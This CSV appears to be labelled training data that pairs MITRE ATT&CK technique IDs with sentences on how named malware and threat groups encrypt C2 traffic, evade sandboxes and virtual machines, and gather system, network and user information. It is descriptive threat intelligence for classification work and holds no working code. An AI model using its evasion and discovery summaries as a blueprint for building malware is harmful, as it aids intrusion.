label_tec,sentence
T1573,FatDuke can AES encrypt C2 communications.
T1573,WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.
T1573,BLINDINGCAN has encrypted its C2 traffic with RC4.
T1573,Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.
T1573,SUNBURST encrypted C2 traffic using a single-byte-XOR cipher.
T1573,BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.
T1573,Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers.
T1573,SodaMaster can use RC4 to encrypt C2 communications.
T1573,RainyDay can use RC4 to encrypt C2 communications.
T1573,Nebulae can use RC4 and XOR to encrypt C2 communications.
T1573,Metamorfo has encrypted C2 commands with AES-256.
T1573,BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.
T1573,Another Lazarus Group malware sample XORs C2 traffic.
T1573,Inception has encrypted network communications with AES.
T1497,"Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size."
T1497,"RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment."
T1497,OopsIE performs several anti-VM and sandbox checks on the victim's machine.
T1497,"GravityRAT uses WMI to check the BIOS and manufacturer information for strings like ""VMWare"", ""Virtual"", and ""XEN"" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment."
T1497,"UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine."
T1497,"Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis."
T1497,Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.
T1497,"Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected."
T1497,SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.
T1497,QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.
T1497,NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.
T1497,OilRig has used macros to verify if a mouse is connected to a compromised machine.
T1542,System firmware like BIOS and EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity.
T1082,Tools such as Systeminfo can be used to gather detailed system information.
T1082,JPIN can obtain system information such as OS version and disk space.
T1082,"OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks."
T1082,Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.
T1082,"Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system."
T1082,"DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine."
T1082,"FALLCHILL can collect operating system  version information, processor information, system name, and information about installed disks from the victim."
T1082,Zebrocy also runs the systeminfo command to gather system information.
T1082,"ChChes collects the victim hostname, window resolution, and Microsoft Windows version."
T1082,"RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information."
T1082,SLOWDRIFT collects and sends system information to its C2.
T1082,POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.
T1082,SOUNDBITE is capable of gathering system information.
T1082,UPPERCUT has the capability to gather the system’s hostname and OS version.
T1082,More_eggs has the capability to gather the OS version and computer name.
T1082,"BUBBLEWRAP collects system information, including the operating system version and hostname."
T1082,Orz can gather the victim OS version and whether it is 64 or 32 bit.
T1082,PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.
T1082,"MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution."
T1082,"Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information."
T1082,NavRAT uses systeminfo on a victim’s machine.
T1082,TURNEDUP is capable of gathering system information.
T1082,"HOPLIGHT has been observed collecting victim machine information like OS version, drivers, volume information and more."
T1082,"StoneDrill has the capability to discover the system OS, Windows version, architecture and environment."
T1082,njRAT enumerates the victim operating system and computer name during the initial infection.
T1082,Ixeshe collects the computer name of the victim's system during the initial infection.
T1082,LightNeuron gathers the victim computer name using the Win32 API call GetComputerName.
T1082,"OSX/Shlayer collects the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion."
T1082,PoetRAT has the ability to gather information about the compromised host.
T1082,Rifdoor has the ability to identify the Windows version on the compromised host.
T1082,Attor monitors the free disk space on the system.
T1082,"Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators."
T1082,BackConfig has the ability to gather the victim's computer name.
T1082,"Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on."
T1082,"FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host."
T1082,"BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available."
T1082,SharpStage has checked the system settings to see if Arabic is the configured language.
T1082,MoleNet can collect information about the about the system.
T1082,BlackMould can enumerate local drives on a compromised host.
T1082,KillDisk retrieves the hard disk name by calling the CreateFileA to \\.\PHYSICALDRIVE0 API.
T1082,"Cuba can enumerate local drives, disk type, and disk free space."
T1082,QakBot can collect system information including the OS version and domain on a compromised host.
T1082,"APT37 collects the computer name, the BIOS model, and execution path."
T1082,"Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory."
T1082,APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.
T1082,Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine.
T1082,"Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server."
T1082,"Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine."
T1082,"Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information."
T1082,A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.. APT18 can collect system information from the victim’s machine.
T1082,Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.
T1082,"Frankenstein has enumerated hosts, looking for the system's machine name."
T1082,Rocke has used uname -m to collect the name and information about the infected system's kernel.
T1082,Wizard Spider has used “systeminfo” and similar commands to acquire detailed configuration information of a victim machine.
T1082,UNC2452 used fsutil to check available free space before executing actions that might create large files on disk.
T1082,"Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host."
T1082,Windigo has used a script to detect which Linux distribution and version is currently installed on the system.
T1082,APT29 used fsutil to check available free space before executing actions that might create large files on disk.
T1614,"Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions."
T1614,SynAck lists all the keyboard layouts installed on the victim’s system using GetKeyboardLayoutList API and checks against a hardcoded language code list.
T1614,"If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files."
T1614,"It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN."
T1614,Spark has checked the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word “Arabic” before executing.
T1614,"Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
T1614,"Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services."
T1016,Several operating system administration utilities exist that can be used to gather this information.
T1016,Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information.
T1016,POWRUNER may collect network configuration data by running ipconfig /all on a victim.
T1016,Orz can gather victim proxy information.
T1016,"Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print."
T1016,Brave Prince gathers network configuration information as well as the ARP cache.
T1016,Felismus collects the victim LAN IP address and sends it to the C2 server.
T1016,Kazuar gathers information about network adapters.
T1016,Unknown Logger can obtain information about the victim's IP address.
T1016,Denis uses ipconfig to gather the IP address from the system.
T1016,KEYMARBLE gathers the MAC address of the victim’s machine.
T1016,More_eggs has the capability to gather the IP address from the victim's machine.
T1016,Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.
T1016,Octopus can collect the host IP address from the victim’s machine.
T1016,Naid collects the domain name from a compromised host.
T1016,Epic uses the nbtstat -n and nbtstat -s commands on the victim’s machine.
T1016,Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol  entries.
T1016,SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.
T1016,down_new has the ability to identify the MAC address of a compromised host.
T1016,OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.
T1016,Stuxnet collects the IP address of a compromised system.
T1016,Dtrack can collect the host's IP addresses using the ipconfig command.
T1016,ShadowPad has collected the domain name of the victim system.
T1016,Explosive has collected the MAC address from the victim's machine.
T1016,EKANS can determine the domain of a compromised host.
T1016,"QakBot can use net config workstation, arp -a, and ipconfig /all to gather network configuration information."
T1016,xCaon has used the GetAdaptersInfo API call to get the victim's MAC address.
T1016,BLUELIGHT can collect IP information from the victim’s machine.
T1016,Kobalos can record the IP address of the target machine.
T1016,APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.
T1016,Darkhotel has collected the IP address and network adapter information from the victim’s machine.
T1016,OilRig has run ipconfig /all on a victim.
T1016,"Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain."
T1016,MuddyWater has used malware to collect the victim’s IP address and domain name.
T1016,GALLIUM used ipconfig /all to obtain information about the victim network configuration.
T1016,"Wizard Spider has used ""ipconfig"" to identify the network configuration of a victim machine."
T1016,Higaisa used ipconfig to gather network configuration information.
T1016,Mustang Panda has used ipconfig and arp to determine network configuration information.
T1049,Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.
T1049,RATANKBA uses netstat -ano to search for specific IP address ranges.
T1049,Sykipot may use netstat -ano to display active network connections.
T1049,Comnie executes the netstat -ano command.
T1049,BlackEnergy has gathered information about local network connections using netstat.
T1049,GravityRAT uses the netstat command to find open ports on the victim’s machine.
T1049,Trojan.Karagany can use netstat to collect a list of network connections.
T1049,NETWIRE can capture session logon details from a compromised host.
T1049,Conti can enumerate routine network connections from a compromised host.
T1049,Poseidon Group obtains and saves information about victim network interfaces and addresses.
T1049,It has also accessed network diagram files useful for understanding how a host's network was configured.
T1049,Chimera has used netstat -ano | findstr EST to discover network connections.
T1049,TeamTNT runs netstat -anp to search for rival malware connections.
T1049,TeamTNT has also used libprocesshider to modify /etc/ld.so.preload.
T1033,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system."
T1033,"They may do this, for example, by retrieving account usernames or by using OS Credential Dumping."
T1033,Reaver collects the victim's username.
T1033,Backdoor.Oldrea collects the current username from the victim.
T1033,WINERACK can gather information on the victim username.
T1033,Agent Tesla can collect the username from the victim’s machine.
T1033,Azorult can collect the username from the victim’s machine.
T1033,PowerDuke has commands to get the current user's name and SID.
T1033,Cardinal RAT can collect the username from a victim machine.
T1033,InvisiMole lists local users and session information.
T1033,A module in Prikormka collects information from the victim about the current user name.
T1033,SynAck gathers user names from infected hosts.
T1033,Zebrocy gets the username from the system.
T1033,Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.
T1033,FlawedAmmyy enumerates the current user during the initial infection.
T1033,ServHelper will attempt to enumerate the username of the victim.
T1033,Ixeshe collects the username from the victim’s machine.
T1033,"PoetRAT sent username, computer name, and the previously generated UUID in reply to a ""who"" command from C2."
T1033,SDBbot has the ability to identify the user on a compromised host.
T1033,Valak can gather information regarding the user.
T1033,Goopy has the ability to enumerate the infected system's user name.
